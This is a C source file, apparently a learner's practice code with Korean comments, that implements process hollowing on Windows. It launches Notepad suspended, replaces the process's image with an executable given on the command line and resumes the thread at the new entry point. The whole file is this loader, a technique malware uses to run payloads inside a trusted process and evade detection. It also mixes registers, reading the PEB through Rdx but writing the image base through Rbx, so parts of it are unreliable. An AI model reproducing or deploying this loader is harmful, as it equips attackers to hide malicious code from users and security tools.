#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);

typedef struct _FLOATING_SAVE_AREA
{
	ULONG ControlWord;
	ULONG StatusWord;
	ULONG TagWord;
	ULONG ErrorOffset;
	ULONG ErrorSelector;
	ULONG DataOffset;
	ULONG DataSelector;
	UCHAR RegisterArea[80];
	ULONG Cr0NpxState;
} FLOATING_SAVE_AREA, * PFLOATING_SAVE_AREA;


int main(int argc, const char* argv[]) {
	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;
	PIMAGE_SECTION_HEADER pSecH;

	PVOID image, mem, base;
	DWORD i, read, nSizeOfFile;
	HANDLE hFile;

	STARTUPINFO si = { sizeof(si) }; //TARTUPINFO 구조체 변수들은 프로세스의 속성 정보를 전달
	PROCESS_INFORMATION pi; //생성된 프로세스 정보를 담는 구조체 (메인 스레드 정보)
	char szCommandLine[] = TEXT("NOTEPAD");
	
	CONTEXT tContext;
	tContext.ContextFlags = CONTEXT_FULL;



	if (!CreateProcess(NULL, szCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("\nCreateProcess false... %d \n", GetLastError());
		return 1;
	}


	//대체할 프로그램을 파일 형식으로 열어두기위한 CreateFile.
	hFile = CreateFile(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("\nCreateFile false... \n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	nSizeOfFile = GetFileSize(hFile, NULL);

	image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) {
		printf("\nReadFile false... \n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}
	NtClose(hFile);


	//시그니처 체크
	pDosH = (PIMAGE_DOS_HEADER)image;
	if (pDosH->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("\nInvalid execute format.\n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	//DOS_HEADER의 e_lfanew 값 통해서 NT_HEADER로 점프 가능. IMAGE_NT_HEADER 주소 얻기
	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew);

	// 자식프로세스의 메인 스레드의 컨텍스트얻기.
	// pi 구조체의 스레드 부분에서 현재 레지스터 상태를 _CONTEXT 구조체에 초기화.. ★ 내가몰랐던부분
	NtGetContextThread(pi.hThread, &tContext);


	//타겟 프로세스(껍데기) PEB로부터 ImageBase address 얻기
	//ebx 레지스터에서 PEB 주소를 가져오고 PEB에서 실행 이미지의 기본 주소를 읽음
	NtReadVirtualMemory(pi.hProcess, (PVOID)(tContext.Rdx + (sizeof(SIZE_T)*2)), &base, sizeof(PVOID), NULL);
	
	// 만약 원본 이미지가 대체할 실행파일과 주소가 동일하다면 자식프로세스에서 원본 실행파일을 바로 언매핑함.
	if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase) {
		printf("\nrebase할필요가 없음. 바로 언매핑 \n");
		NtUnmapViewOfSection(pi.hProcess, base);
	}


	// 언매핑된 주소공간에 새로운 가상공간 할당. 
	//suspended 상태의 프로세스의 imagebase부분에 대체할 파일의 SizeOfImage만큼 가상영역 할당.
	// 만약 해당 주소부분이 매핑된 상태면 실패.
	printf("\n자식프로세스 안에 메모리를 할당한다 치직 \n");
	mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);

	if (!mem) {
		printf("\nVirtualAllocEx false... \n");
		NtTerminateProcess(pi.hProcess,1);
		return 1;
	}
	printf("\n메모리 할당. Address: %#zx\n", (SIZE_T)mem);


	// 할당된 가상공간에 Write
	// OPTIONAL_HEADER를 Write한 후 섹션 개수만큼 모든 섹션에 다 쓴다.
	NtWriteVirtualMemory(pi.hProcess,mem,image,pNtH->OptionalHeader.SizeOfHeaders,NULL);

	for (i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pSecH->VirtualAddress), (PVOID)((LPBYTE)image + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL);
	}


	// CONTEXT 구조체 재정의 및 스레드 재가동
	//주입된 이미지의 시작점에 rax 레지스터 설정
	tContext.Rax = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint);
	printf("New EP: %#zx\n", tContext.Rax);

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(tContext.Rbx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	printf("\n자식프로세스의 메인스레드 컨텍스트가 셋팅됨. \n");
	NtSetContextThread(pi.hThread, &tContext);

	printf("\n이얍 재가동 한다잇!! \n");
	NtResumeThread(pi.hThread, NULL);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	VirtualFree(image, 0, MEM_RELEASE);
	return 0;
}